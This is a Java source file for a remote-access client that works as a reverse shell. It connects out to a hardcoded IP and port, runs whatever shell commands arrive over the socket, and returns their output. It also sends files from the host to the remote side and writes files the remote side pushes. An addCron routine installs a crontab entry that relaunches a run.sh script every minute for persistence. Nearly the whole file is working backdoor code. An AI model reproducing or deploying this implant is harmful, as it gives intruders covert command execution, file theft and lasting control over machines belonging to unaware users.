package com.zs25;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class Client {
    private String ip = "10.52.0.148";
    private int port = 55555;
    private BufferedReader reader;
    private ProcessBuilder pb = new ProcessBuilder();
    private PrintWriter writer;
    private Socket socket;
    private String shell = "/bin/sh";

    public Client() {
        createSocket();
    }

    public ProcessBuilder getProcessBuilder() {
        return pb;
    }

    public Socket getSocket() {
        return socket;
    }

    public BufferedReader getIn() {
        return reader;
    }

    public void setInputStream(BufferedReader reader) {
        this.reader = reader;
    }

    public boolean createSocket() {
        try {
            socket = new Socket(ip, port);

            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            writer = new PrintWriter(socket.getOutputStream());
        } catch (Exception e) {
            return false;
        }
        return true;
    }

    public void runCmd(String command) {
        try {
            pb.command(shell, "-c", command);
            pb.redirectErrorStream(true);

            Process p = pb.start();
            if(!p.waitFor(10, TimeUnit.SECONDS)) {
                writer.println("Process not closed. PID: " + p.pid());
            } else {
                BufferedReader output = new BufferedReader(new InputStreamReader(p.getInputStream()));

                String line;
                while ((line = output.readLine()) != null) {
                    writer.println(line);
                }
            }
            writer.println("\0");
            writer.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void cd(String command) {
        if (command.matches("cd")) {
            writer.println("\0");
            writer.flush();
            return ;
        } else if (command.matches("cd ..")) {
            File f = new File(pb.directory().getParent());
            pb.directory(f);
            writer.println("\0");
            writer.flush();
        } else {
            if (command.split(" ").length < 2) {
                writer.println("\0");
                writer.flush();
                return ;
            }
            String directory = command.split(" ")[1];

            if (!directory.contains("/")) {
                directory = pb.directory().toString() + "/" + directory;
            }

            File f = new File(directory);
            if (f.isDirectory()) {
                pb.directory(f);
                writer.println("\0");
                writer.flush();
            } else {
                writer.println("Directory not found...");
                writer.println("\0");
                writer.flush();
            }
        }
    }

    public void putFile(String filename) {
        File file;
        if (filename.charAt(0) == '/') {
            file = new File(filename);
        } else {
            file = new File(pb.directory() + "/" + filename);
        }

        if (file.isFile()) {
            try (FileInputStream fileInputStream = new FileInputStream(file)) {

                DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                dataOutputStream.writeUTF(filename);
                dataOutputStream.writeLong(file.length());

                int bytesRead;
                byte[] buffer = new byte[8192];
                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    dataOutputStream.write(buffer, 0, bytesRead);
                }
                dataOutputStream.flush();
                // System.out.println(reader.readLine());
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }
        } else {
            writer.println("-1");
            writer.flush();
        }
    }

    // public void putFile(String filename) {
    //     File file;

    //     if (filename.contains("/")) {
    //         file = new File(filename);
    //     } else {
    //         file = new File(pb.directory() + "/" + filename);
    //     }

    //     if (file.isFile()) {
    //         writer.println(file.getName());
    //         writer.flush();

    //         int bytes = 0;
    //         byte[] buffer = new byte[(int) file.length()];
    //         long size = file.length();
    //         try (FileInputStream fileInputStream = new FileInputStream(file)) {
    //             DataOutputStream out = new DataOutputStream(socket.getOutputStream());
    //             out.writeLong(size);

    //             while ((bytes = fileInputStream.read(buffer)) != -1) {
    //                 out.write(buffer, 0, bytes);
    //             }
    //             out.flush();
    //         } catch (Exception e) {

    //         }
    //     } else {
    //         writer.println("-1");
    //         writer.flush();
    //     }
    // }

    public void getFile() {
        try {
            DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());

            String remoteFilename = dataInputStream.readUTF();
            long size = dataInputStream.readLong();
            System.out.println(remoteFilename);
            System.out.println("File size: "+ size);

            // System.out.println("File Size: " + size);

            File file = new File(pb.directory() + "/" + remoteFilename);
            file.createNewFile();
            int bytesRead;
            byte[] buffer = new byte[4 * 1024];

            try (FileOutputStream fileOutputStream = new FileOutputStream(file)) {
                while (size > 0 && (bytesRead = dataInputStream.read(buffer)) != -1) {
                    fileOutputStream.write(buffer, 0, bytesRead);
                    size -= bytesRead;
                }
                fileOutputStream.flush();
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
            // return false;
        }
        // return true;
    }

    public void addCron() {
        try {
            String class1 = Client.class.getSimpleName();
            String command = "crontab -l /tmp/crontab_new";
            pb.command(shell, "-c", command);
            Process p;
            p = pb.start();
            p.waitFor();

            String username = System.getProperty("user.name");

            pb.command(shell, "-c", "cp " + pb.directory() + "/" + "run.sh" + " /home/" + username + "/.config/");
            p = pb.start();
            p.waitFor();


            command = "echo '*/1 * * * * /home/" + username + "/.config/" + "run.sh" + "' >> /tmp/crontab_new";
            pb.command(shell, "-c", command);
            p = pb.start();
            p.waitFor();


            pb.command(shell, "-c", "crontab /tmp/crontab_new");
            p = pb.start();
            p.waitFor();
        } catch (Exception e) {

        }
    }

    public static void main(String[] args) throws Exception{
        Client client = new Client();
        client.getProcessBuilder().directory(new File(System.getProperty("user.dir")));

        if (args.length < 0 || (args.length > 0 && args[0].equals("True"))) {
            client.addCron();

        } else {
            while (client.getSocket().isConnected()) {
                try {
                    String buffer;
                    while ((buffer = client.getIn().readLine()) != null) {
                        if (buffer.contains("cd")) {
                            client.cd(buffer);
                        } else if (buffer.contains("get ")) {
                            client.putFile(buffer.split(" ")[1]);
                        } else if (buffer.contains("put "))  {
                            client.getFile();
                        }
                        else {
                            client.runCmd(buffer);
                        }
                    }
                    if (buffer == null) {
                        client.getSocket().close();
                        break;
                    }
                } catch (Exception e) {
                    System.out.println(e.getMessage());
                    client.getSocket().close();
                    break;
                }
            }
        }
    }
}
